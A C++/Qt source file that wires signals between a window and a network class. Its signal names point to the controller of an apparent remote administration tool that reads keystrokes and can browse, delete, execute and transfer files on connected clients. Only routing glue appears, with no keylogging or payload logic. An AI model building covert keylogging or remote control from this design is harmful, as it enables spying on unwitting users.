#include			"RxBridge.h"

RxBridge::RxBridge(void)
{
}

RxBridge::~RxBridge(void)
{
	//this->setTerminationEnabled(true);
	//this->terminate();
}

void				RxBridge::run()
{
	RxNetwork		net(SV_BASE_PORT);

	/* Net to Window */
	QObject::connect(&net, SIGNAL(NewMonitorEventIncident(std::string)), this, SIGNAL(NewMonitorEventIncident(std::string)));
	QObject::connect(&net, SIGNAL(NewMonitorEventSendind(std::string, unsigned int)), this, SIGNAL(NewMonitorEventSendind(std::string, unsigned int)));
	QObject::connect(&net, SIGNAL(NewMonitorEventReception(std::string, unsigned int)), this, SIGNAL(NewMonitorEventReception(std::string, unsigned int)));
	QObject::connect(&net, SIGNAL(NewUpDownEvent(std::string)), this, SIGNAL(NewUpDownEvent(std::string)));
	QObject::connect(&net, SIGNAL(NetAnswerKeyLogInfos(std::string, bool, std::string)), this, SIGNAL(NetAnswerKeyLogInfos(std::string, bool, std::string)));
	QObject::connect(&net, SIGNAL(ClientIdentified(std::string)), this, SIGNAL(ClientIdentified(std::string)));
	QObject::connect(&net, SIGNAL(ClientCrashed(std::string)), this, SIGNAL(ClientCrashed(std::string)));
	QObject::connect(&net, SIGNAL(ClientAnsVersion(std::string, std::string)), this, SIGNAL(ClientAnsVersion(std::string, std::string)));
	QObject::connect(&net, SIGNAL(ClientAnsFs(std::string, FileInfo)), this, SIGNAL(ClientAnsFs(std::string, FileInfo)));
	QObject::connect(&net, SIGNAL(ClientAnsFsNext(std::string, FileInfo)), this, SIGNAL(ClientAnsFsNext(std::string, FileInfo)));
	QObject::connect(&net, SIGNAL(ClientAnsKeyPressed(std::string, std::string)), this, SIGNAL(ClientAnsKeyPressed(std::string, std::string)));
	/* Window to Net */
	QObject::connect(this, SIGNAL(WinAskVer(std::string)), &net, SLOT(WinAskVer(std::string)));
	QObject::connect(this, SIGNAL(WinAskFs(std::string)), &net, SLOT(WinAskFs(std::string)));
	QObject::connect(this, SIGNAL(WinAskKeyLogInfos(std::string)), &net, SLOT(WinAskKeyLogInfos(std::string)));
	QObject::connect(this, SIGNAL(WinAskCd(std::string, std::string)), &net, SLOT(WinAskCd(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskDel(std::string, std::string)), &net, SLOT(WinAskDel(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskCpy(std::string, std::string)), &net, SLOT(WinAskCpy(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskPst(std::string)), &net, SLOT(WinAskPst(std::string)));
	QObject::connect(this, SIGNAL(WinAskRnm(std::string, std::string, std::string)), &net, SLOT(WinAskRnm(std::string, std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskCrt(std::string, std::string, std::string)), &net, SLOT(WinAskCrt(std::string, std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskExe(std::string, std::string)), &net, SLOT(WinAskExe(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskAkl(std::string)), &net, SLOT(WinAskAkl(std::string)));
	QObject::connect(this, SIGNAL(WinAskOkl(std::string)), &net, SLOT(WinAskOkl(std::string)));
	QObject::connect(this, SIGNAL(WinAskCkl(std::string)), &net, SLOT(WinAskCkl(std::string)));
	QObject::connect(this, SIGNAL(WinAskDwn(std::string, std::string)), &net, SLOT(WinAskDwn(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskUpl(std::string, std::string)), &net, SLOT(WinAskUpl(std::string, std::string)));
	/* UpDown to Net to Window */
	QObject::connect(&net, SIGNAL(UpdnIncident(std::string)), this, SIGNAL(UpdnIncident(std::string)));
	QObject::connect(&net, SIGNAL(UpdnNewPartRec(int, int)), this, SIGNAL(UpdnNewPartRec(int, int)));
	QObject::connect(&net, SIGNAL(UpdnDlFinished()), this, SIGNAL(UpdnDlFinished()));
	QObject::connect(&net, SIGNAL(UpdnNewPartSnd(int, int)), this, SIGNAL(UpdnNewPartSnd(int, int)));
	QObject::connect(&net, SIGNAL(UpdnUpFinished()), this, SIGNAL(UpdnUpFinished()));

	net.NetLoop();
}
